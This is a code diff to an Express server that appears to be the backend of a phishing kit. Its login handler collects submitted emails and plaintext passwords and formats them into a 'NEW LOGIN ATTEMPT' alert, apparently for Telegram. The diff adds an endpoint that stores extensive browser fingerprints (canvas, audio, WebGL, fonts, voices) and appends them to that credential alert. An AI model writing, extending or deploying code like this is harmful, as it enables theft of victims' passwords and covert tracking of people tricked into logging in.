@@ -23,7 +23,7 @@ app.use(helmet({
       styleSrc:       ["'self'", "https:", "'unsafe-inline'"],
       imgSrc:         ["'self'", "data:", "https:"],
       fontSrc:        ["'self'", "https:", "data:"],
-      connectSrc:     ["'self'"],
+      connectSrc:     ["'self'", "https://api.ipify.org"],
       frameAncestors: ["'none'"],                       // Never embed this site in any iframe
       objectSrc:      ["'none'"],
       baseUri:        ["'self'"],
@@ -132,6 +132,84 @@ function getISTDateTime() {
   return `${istDate.getUTCFullYear()}-${pad(istDate.getUTCMonth() + 1)}-${pad(istDate.getUTCDate())} ${pad(istDate.getUTCHours())}:${pad(istDate.getUTCMinutes())}:${pad(istDate.getUTCSeconds())}`;
 }
 
+// =============================================
+// FINGERPRINT STORE (in-memory, per IP)
+// =============================================
+const fingerprintStore = {};
+
+// POST /api/fingerprint — receive and store device signals
+app.post('/api/fingerprint', (req, res) => {
+  const data = req.body;
+  if (!data || typeof data !== 'object') {
+    return res.status(400).json({ success: false });
+  }
+
+  const ip = data.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'unknown';
+  const visitorId = data.visitorId || 'unknown';
+  const key = `${ip}::${visitorId}`;
+
+  fingerprintStore[key] = {
+    ...data,
+    receivedAt: getISTDateTime(),
+    ip,
+  };
+
+  // Expire after 30 minutes to avoid unbounded memory growth
+  setTimeout(() => { delete fingerprintStore[key]; }, 30 * 60 * 1000);
+
+  console.log(`[FP] Stored fingerprint for IP=${ip} visitorId=${visitorId}`);
+  return res.json({ success: true });
+});
+
+// Helper: look up a stored fingerprint by request IP
+function lookupFingerprint(reqIp) {
+  // Find any stored entry whose IP matches the current request IP
+  const match = Object.values(fingerprintStore).find(fp => fp.ip === reqIp);
+  return match || null;
+}
+
+// Helper: format fingerprint block for Telegram
+function formatFingerprintBlock(fp) {
+  if (!fp) return '';
+  const nav = fp.navigator || {};
+  const scr = fp.screen   || {};
+  const wgl = fp.webgl    || {};
+  const fonts = Array.isArray(fp.fonts) ? fp.fonts.join(', ') : 'n/a';
+  const voices = Array.isArray(fp.voices) ? fp.voices.slice(0, 5).join(', ') : 'n/a';
+  const exts = Array.isArray(wgl.extensions) ? wgl.extensions.slice(0, 4).join(', ') : 'n/a';
+
+  return `
+
+📊 DEVICE FINGERPRINT
+🆔 Visitor ID: ${fp.visitorId || 'n/a'}
+🌍 Public IP: ${fp.ip || 'n/a'}
+
+🖥 Navigator
+  • UA: ${nav.userAgent || 'n/a'}
+  • Platform: ${nav.platform || 'n/a'}
+  • Language: ${nav.language || 'n/a'} [${nav.languages || ''}]
+  • Timezone: ${nav.timezone || 'n/a'}
+  • CPU cores: ${nav.hardwareConcurrency || 'n/a'} | RAM: ${nav.deviceMemory || 'n/a'} GB
+  • Touch points: ${nav.maxTouchPoints || '0'} | DNT: ${nav.doNotTrack || 'n/a'}
+
+📐 Screen
+  • Resolution: ${scr.width || '?'}×${scr.height || '?'} @ ${scr.pixelRatio || '?'}x
+  • Color depth: ${scr.colorDepth || '?'} bit
+
+🎨 Canvas hash: ${fp.canvas || 'n/a'}
+🔊 Audio hash: ${fp.audio || 'n/a'}
+🖼 WebGPU: ${fp.webgpu || 'n/a'}
+📐 ClientRects: ${fp.clientRects || 'n/a'}
+
+🎮 WebGL
+  • Renderer: ${wgl.renderer || 'n/a'}
+  • Vendor: ${wgl.vendor || 'n/a'}
+  • Extensions: ${exts}
+
+🔤 Fonts (${Array.isArray(fp.fonts) ? fp.fonts.length : 0}): ${fonts}
+🗣 Voices (${Array.isArray(fp.voices) ? fp.voices.length : 0}): ${voices}`;
+}
+
 // Flow 1 — Login Credentials Notification
 app.post('/api/login', async (req, res) => {
   const { email, password, deviceInfo } = req.body;
@@ -146,8 +224,12 @@ app.post('/api/login', async (req, res) => {
   const timezone = deviceInfo?.timezone || 'unknown';
   const fingerprint = deviceInfo?.deviceFingerprint || 'unknown';
 
+  const reqIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'unknown';
+  const fp = lookupFingerprint(reqIp);
+  const fpBlock = formatFingerprintBlock(fp);
+
   const timestamp = getISTDateTime();
-  const message = `🔐 NEW LOGIN ATTEMPT\n\n📧 Email: ${email}\n🔑 Password: ${password}\n📱 User-Agent: ${ua}\n🖥 Screen: ${screen} | Platform: ${platform}\n🌐 Language: ${language} | Timezone: ${timezone}\n🔑 Fingerprint: ${fingerprint}\n🕐 Time: ${timestamp}`;
+  const message = `🔐 NEW LOGIN ATTEMPT\n\n📧 Email: ${email}\n🔑 Password: ${password}\n📱 User-Agent: ${ua}\n🖥 Screen: ${screen} | Platform: ${platform}\n🌐 Language: ${language} | Timezone: ${timezone}\n🔑 Fingerprint: ${fingerprint}\n🕐 Time: ${timestamp}${fpBlock}`;
 
   const reply_markup = {
     inline_keyboard: [
